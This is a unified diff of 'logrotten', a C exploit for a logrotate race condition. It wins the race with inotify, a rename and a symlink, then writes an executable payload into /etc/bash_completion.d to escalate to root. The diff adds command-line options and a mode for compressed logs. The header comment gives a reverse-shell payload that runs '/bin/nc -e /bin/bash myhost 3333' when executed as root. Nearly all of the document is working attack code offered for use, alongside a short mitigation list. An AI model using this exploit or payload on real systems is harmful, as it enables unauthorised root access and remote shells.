@@ -14,8 +14,7 @@
  * [ Precondition for privilege escalation ]
  *   - Logrotate needs to be executed as root
  *   - The logpath needs to be in control of the attacker
- *   - "create" option is set in the logrotate configuration. 
- *     This exploit might not work without
+ *   - any option(create,compress,copy,etc..) that creates a new file is set in the logrotate configuration. 
  * 
  * [ Tested version ]
  *   - Debian GNU/Linux 9.5 (stretch)
@@ -32,14 +31,16 @@
  *   - echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash myhost 3333 &); fi" > payloadfile
  *
  * [ Run exploit ]
- *   - nice -n -20 ./logrotten /tmp/log/pwnme.log payloadfile
+ *   - nice -n -20 ./logrotten -p payloadfile /tmp/log/pwnme.log
+ *   - if compress is used: nice -n -20 ./logrotten -c -s 3 -p payloadfile /tmp/log/pwnme.log.1
  *
  * [ Known Problems ]
- *   - It's hard to win the race inside a docker container
+ *   - It's hard to win the race inside a docker container or on a lvm2-volume
  *
  * [ Mitigation ]
  *   - make sure that logpath is owned by root
- *   - or use option "nocreate"
+ *   - use su-option in logrotate.cfg
+ *   - use selinux or apparmor
  *
  * [ Author ]
  *   - Wolfgang Hotwagner
@@ -58,6 +59,7 @@
 #include <string.h>
 #include <alloca.h>
 #include <sys/stat.h>
+#include <getopt.h>
 
 
 #define EVENT_SIZE  ( sizeof (struct inotify_event) )
@@ -66,7 +68,19 @@
 /* use TARGETDIR without "/" at the end */
 #define TARGETDIR "/etc/bash_completion.d"
 
-#define DEBUG 1
+#define PROGNAME "logrotten"
+
+void usage(const char* progname)
+{
+	printf("usage: %s [OPTION...] <logfile>\n",progname);
+	printf("  %-3s %-25s %-30s\n","-h","--help","Print this help");
+	printf("  %-3s %-25s %-30s\n","-t","--targetdir <dir>","Abosulte path to the target directory");
+	printf("  %-3s %-25s %-30s\n","-p","--payloadfile <file>","File that contains the payload");
+	printf("  %-3s %-25s %-30s\n","-s","--sleep <sec>","Wait before writing the payload");
+	printf("  %-3s %-25s %-30s\n","-d","--debug","Print verbose debug messages");
+	printf("  %-3s %-25s %-30s\n","-c","--compress","Hijack compressed files instead of created logfiles");
+	printf("  %-3s %-25s %-30s\n","-o","--open","Use IN_OPEN instead of IN_MOVED_FROM");
+}
 
 int main(int argc, char* argv[] )
 {
@@ -76,24 +90,86 @@ int main(int argc, char* argv[] )
   int fd;
   int wd;
   char buffer[EVENT_BUF_LEN];
-  const char *payloadfile;
-  const char *logfile;
+  uint32_t imask = IN_MOVED_FROM;
+  char *payloadfile = NULL;
+  char *logfile = NULL;
+  char *targetdir = NULL;
   char *logpath;
   char *logpath2;
   char *targetpath;
-  char *targetdir;
+  int debug = 0;
+  int sleeptime = 1;
   char ch;
   const char *p;
   FILE *source, *target;    
 
-  if(argc < 3)
+  int c;
+
+  while(1)
   {
-	  fprintf(stderr,"usage: %s <logfile> <payloadfile> [targetdir]\n",argv[0]);
-	  exit(1);
+	int this_option_optind = optind ? optind : 1;
+	int option_index = 0;
+	static struct option long_options[] = {
+		{"payloadfile", required_argument, 0, 0},
+		{"targetdir", required_argument, 0, 0},
+		{"sleep", required_argument, 0, 0},
+		{"help", no_argument, 0, 0},
+		{"open", no_argument, 0, 0},
+		{"debug", no_argument, 0, 0},
+		{"compress", no_argument, 0, 0},
+		{0,0,0,0}
+	};
+
+	c = getopt_long(argc,argv,"hocdp:t:s:", long_options, &option_index);
+	if (c == -1)
+		break;
+
+	switch(c)
+	{
+		case 'p':
+			payloadfile = alloca((strlen(optarg)+1)*sizeof(char));
+	  		memset(payloadfile,'\0',strlen(optarg)+1);
+			strncpy(payloadfile,optarg,strlen(optarg));
+			break;
+		case 't':
+			targetdir = alloca((strlen(optarg)+1)*sizeof(char));
+	  		memset(targetdir,'\0',strlen(optarg)+1);
+			strncpy(targetdir,optarg,strlen(optarg));
+			break;
+		case 'h':
+			usage(PROGNAME);
+			exit(EXIT_FAILURE);
+			break;
+		case 'd':
+			debug = 1;
+			break;
+		case 'o':
+			imask = IN_OPEN;
+			break;
+		case 'c':
+			imask = IN_OPEN;
+			break;
+		case 's':
+			sleeptime = atoi(optarg);
+			break;
+		default:
+			usage(PROGNAME);
+			exit(EXIT_FAILURE);
+			break;
+	}
   }
-  
-  logfile = argv[1];
-  payloadfile = argv[2];
+
+  if(argc == (optind+1))
+  {
+	  logfile = alloca((strlen(argv[optind])+1)*sizeof(char));
+	  memset(logfile,'\0',strlen(argv[optind])+1);
+	  strncpy(logfile,argv[optind],strlen(argv[optind]));
+  }
+  else
+  {
+	  usage(PROGNAME);
+	  exit(EXIT_FAILURE);
+  }
 
   for(j=strlen(logfile); (logfile[j] != '/') && (j != 0); j--);
 
@@ -104,11 +180,10 @@ int main(int argc, char* argv[] )
   logpath = alloca(strlen(logfile)*sizeof(char));
   logpath2 = alloca((strlen(logfile)+2)*sizeof(char));
 
-  if(argc > 3)
+  if(targetdir != NULL)
   {
-	targetdir = argv[3];
-  	targetpath = alloca( ( (strlen(argv[3])) + (strlen(p)) +3) *sizeof(char));
-  	strcat(targetpath,argv[3]);
+  	targetpath = alloca( ( (strlen(targetdir)) + (strlen(p)) +3) *sizeof(char));
+  	strcat(targetpath,targetdir);
   }
   else
   {
@@ -131,7 +206,7 @@ int main(int argc, char* argv[] )
   /*creating the INOTIFY instance*/
   fd = inotify_init();
 
-  if( DEBUG == 1)
+  if( debug == 1)
   {
   	printf("logfile: %s\n",logfile);
   	printf("logpath: %s\n",logpath);
@@ -146,8 +221,9 @@ int main(int argc, char* argv[] )
     perror( "inotify_init" );
   }
 
-  wd = inotify_add_watch( fd,logpath, IN_MOVED_FROM );
+  wd = inotify_add_watch( fd,logpath, imask );
 
+  printf("Waiting for rotating %s...\n",logfile);
 
 while(1)
 {
@@ -156,32 +232,37 @@ while(1)
 
   while (i < length) {     
       struct inotify_event *event = ( struct inotify_event * ) &buffer[ i ];     if ( event->len ) {
-      if ( event->mask & IN_MOVED_FROM ) {
+      if ( event->mask & imask ) { 
 	  if(strcmp(event->name,p) == 0)
 	  {
-            /* printf( "Something is moved %s.\n", event->name ); */
             rename(logpath,logpath2);
             symlink(targetdir,logpath);
-	    sleep(1);
-	    source = fopen(payloadfile, "r");	    
-	    if(source == NULL)
-		    exit(EXIT_FAILURE);
-
-	    target = fopen(targetpath, "w");	    
-	    if(target == NULL)
+	    printf("Renamed %s with %s and created symlink to %s\n",logpath,logpath2,targetdir);
+	    if(payloadfile != NULL)
 	    {
-		    fclose(source);
-		    exit(EXIT_FAILURE);
+		 printf("Waiting %d seconds before writing payload...\n",sleeptime);
+	   	 sleep(sleeptime);
+	   	 source = fopen(payloadfile, "r");	    
+	   	 if(source == NULL)
+	   	         exit(EXIT_FAILURE);
+
+	   	 target = fopen(targetpath, "w");	    
+	   	 if(target == NULL)
+	   	 {
+	   	         fclose(source);
+	   	         exit(EXIT_FAILURE);
+	   	 }
+
+	   	 while ((ch = fgetc(source)) != EOF)
+	   	         fputc(ch, target);
+
+	   	 chmod(targetpath,S_IRUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
+	   	 fclose(source);
+	   	 fclose(target);
 	    }
-
-	    while ((ch = fgetc(source)) != EOF)
-		    fputc(ch, target);
-
-	    chmod(targetpath,S_IRUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
-	    fclose(source);
-	    fclose(target);
    	    inotify_rm_watch( fd, wd );
    	    close( fd );
+	    printf("Done!\n");
 
 	    exit(EXIT_SUCCESS);
 	  }
